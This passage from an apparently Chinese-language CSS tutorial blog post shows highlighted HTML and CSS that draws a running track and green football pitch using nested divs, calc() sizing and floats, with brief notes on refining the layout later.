class="number">7</span>) / <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxRect</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span> - <span class="number">10px</span>);</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxCirc</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="built_in">calc</span>((<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span> - <span class="number">10px</span> - <span class="number">100px</span>)/<span class="number">2</span>) auto;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxRectLeft1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(-<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> + <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> + <span class="number">10px</span> - <span class="number">200px</span>/<span class="number">2</span>);</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.boxRectRight1</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(-<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> + <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> + <span class="number">10px</span> + <span class="number">50px</span>);</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> - <span class="number">100px</span>);</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果图</strong></p><p><img data-src="https://gitee.com/vectorx/ImageCloud/raw/master/html5/20210523215907.png" alt="img"></p><p>由于因为到目前为止，还没有学习更多的布局定位知识，所以一些其他的细节地方比较难绘制</p><p>这里就大概绘制一个雏形出来，等后面学习了绝对定位和相对定位之后再做补充和完善，会相对容易一些</p><hr><h3 id="绿茵足球场完善"><a class="markdownIt-Anchor" href="#绿茵足球场完善">#</a> 绿茵足球场完善</h3><p>学完了浮动，我们终于可以继续完善绿茵足球场了</p><p>废话不多说，直接上代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>田径场<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 公共部分 */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box1</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box2</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box3</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box4</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box5</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box6</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box7</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box8</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRect</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxColLine</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectLeft1</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectLeft2</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCircLeft</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCirc</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCircRight</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectRight1</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectRight2</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.football</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: <span class="number">0.5px</span> white solid;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box2</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box3</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box4</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box5</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box6</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box7</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.box8</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">12.2px</span> auto;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectLeft1</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectLeft2</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCircLeft</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 去除左边框 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">border-left</span>: none;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCircRight</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectRight1</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectRight2</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 去除右边框 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">border-right</span>: none;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* ==========田径场========== */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#DA251E</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">0</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">0</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">0</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box2</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">1</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">1</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">1</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box3</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">2</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">2</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">2</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box4</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">3</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">3</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">3</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box5</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">4</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">4</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">4</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box6</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">5</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">5</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">5</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box7</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">6</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">6</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">6</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box8</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="number">#00923F</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span> + <span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="built_in">calc</span>(<span class="number">360px</span> - <span class="number">12.2px</span>*<span class="number">7</span>) / <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* ==========绿茵足球场========== */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRect</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span> - <span class="number">10px</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">5px</span> auto;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectLeft1</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">10px</span>/<span class="number">2</span> - <span class="number">200px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectLeft2</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(<span class="number">200px</span>/<span class="number">2</span> - <span class="number">100px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCircLeft</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">10px</span>/<span class="number">2</span> - <span class="number">100px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">100px</span> <span class="number">100px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCirc</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">10px</span>/<span class="number">2</span> - <span class="number">100px</span>/<span class="number">2</span>) auto;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span>/<span class="number">2</span> - <span class="number">100px</span> - <span class="number">50px</span> - <span class="number">100px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxCircRight</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">10px</span>/<span class="number">2</span> - <span class="number">100px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">100px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectRight1</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(<span class="number">360px</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">12.2px</span>*<span class="number">7</span>*<span class="number">2</span>/<span class="number">2</span> - <span class="number">10px</span>/<span class="number">2</span> - <span class="number">200px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxRectRight2</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="built_in">calc</span>(<span class="number">200px</span>/<span class="number">2</span> - <span class="number">100px</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.boxColLine</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: <span class="built_in">calc</span>(<span class="number">1719.2px</span>/<span class="number">2</span>/<span class="number">2</span>);</span></span><br><span class="line"><span class="css">            <span class="comment">/* 边框样式 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">border</span>: <span class="number">0.25px</span> white dashed;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* ==========足球========== */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.football</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: black;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box3&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box4&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box5&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box6&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box7&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box8&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRect&quot;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRectLeft1&quot;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxRectLeft2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxCircLeft&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;boxCirc&quot;</span>&gt;</span><span class="tag">&lt;/<span 